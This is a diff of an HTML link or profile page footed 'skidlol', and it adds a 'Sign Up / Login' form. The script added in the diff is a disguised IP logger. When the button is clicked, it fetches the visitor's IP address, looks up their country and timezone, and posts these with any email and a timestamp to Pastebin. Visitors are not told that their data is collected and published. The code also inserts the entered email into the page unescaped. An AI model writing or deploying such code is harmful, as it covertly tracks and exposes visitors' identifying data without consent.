@@ -87,15 +87,37 @@
             position: relative;
             z-index: 2;
         }
-    </style>
-    <script>
-        function showContent() {
-            document.body.classList.add('vignette');
-            document.querySelector('.intro').style.display = 'none';
-            const container = document.querySelector('.container');
-            container.classList.add('visible');
+
+        .auth-form {
+            margin-top: 20px;
         }
-    </script>
+
+        .auth-form input {
+            padding: 10px;
+            margin: 5px;
+            border: none;
+            border-radius: 5px;
+        }
+
+        .auth-form button {
+            padding: 10px 20px;
+            background-color: red;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .auth-form button:hover {
+            background-color: darkred;
+        }
+
+        .user-list {
+            margin-top: 20px;
+            font-size: 14px;
+            color: white;
+        }
+    </style>
 </head>
 <body>
     <div class="intro" onclick="showContent()">Click to enter</div>
@@ -111,6 +133,7 @@
                 <span>𝖉𝖊𝖈𝖊𝖎𝖛𝖊</span>
             </div>
             <div class="profile">
+
                 <a href=""><img src="https://i.ibb.co/Cb53T8v/IMG-5085.jpg" alt="IMG-5085"></a>
                 <span>𝖟𝖊𝖓𝖍</span>
             </div>
@@ -123,9 +146,123 @@
                 <span>𝕬2𝕶</span>
             </div>
         </div>
+        <div class="auth-form">
+            <input type="text" id="email" placeholder="Email (optional)">
+            <button onclick="signup()">Sign Up / Login</button>
+        </div>
+        <div class="user-list" id="user-list"></div>
         <div class="footer">
             © skidlol | 2025
         </div>
     </div>
+
+    <script>
+        // Function to show content
+        function showContent() {
+            document.body.classList.add('vignette');
+            document.querySelector('.intro').style.display = 'none';
+            const container = document.querySelector('.container');
+            container.classList.add('visible');
+        }
+
+        // Function to get user's IP address
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return 'Unknown';
+            }
+        }
+
+        // Function to get user's country and timezone
+        async function getLocationInfo(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return {
+                    country: data.country_name || 'Unknown',
+                    timezone: data.timezone || 'Unknown'
+                };
+            } catch (error) {
+                console.error('Error fetching location info:', error);
+                return {
+                    country: 'Unknown',
+                    timezone: 'Unknown'
+                };
+            }
+        }
+
+        // Function to handle signup/login
+        async function signup() {
+            const email = document.getElementById('email').value || 'No email provided';
+            const ip = await getIP();
+            const locationInfo = await getLocationInfo(ip);
+
+            const userData = {
+                ip: ip,
+                email: email,
+                country: locationInfo.country,
+                timezone: locationInfo.timezone,
+                timestamp: new Date().toISOString()
+            };
+
+            // Save user data to Pastebin (or any other storage)
+            saveToPastebin(userData);
+
+            // Display user data in the list
+            displayUser(userData);
+        }
+
+        // Function to save data to Pastebin
+        async function saveToPastebin(data) {
+            const pastebinApiKey = 'YOUR_PASTEBIN_API_KEY'; // Replace with your Pastebin API key
+            const pastebinUrl = 'https://pastebin.com/api/api_post.php';
+
+            const formattedData = JSON.stringify(data, null, 2);
+
+            const params = new URLSearchParams({
+                api_dev_key: pastebinApiKey,
+                api_option: 'paste',
+                api_paste_code: formattedData,
+                api_paste_name: 'User Data',
+                api_paste_format: 'json'
+            });
+
+            try {
+                const response = await fetch(pastebinUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: params
+                });
+                const result = await response.text();
+                console.log('Pastebin response:', result);
+            } catch (error) {
+                console.error('Error saving to Pastebin:', error);
+            }
+        }
+
+        // Function to display user data in the list
+        function displayUser(userData) {
+            const userList = document.getElementById('user-list');
+            const userEntry = document.createElement('div');
+            userEntry.innerHTML = `
+                <strong>IP:</strong> ${userData.ip}<br>
+                <strong>Email:</strong> ${userData.email}<br>
+                <strong>Country:</strong> ${userData.country}<br>
+                
+
+                
+                <strong>Timezone:</strong> ${userData.timezone}<br>
+                <strong>Timestamp:</strong> ${userData.timestamp}<br>
+                <hr>
+            `;
+            userList.appendChild(userEntry);
+        }
+    </script>
 </body>
 </html>
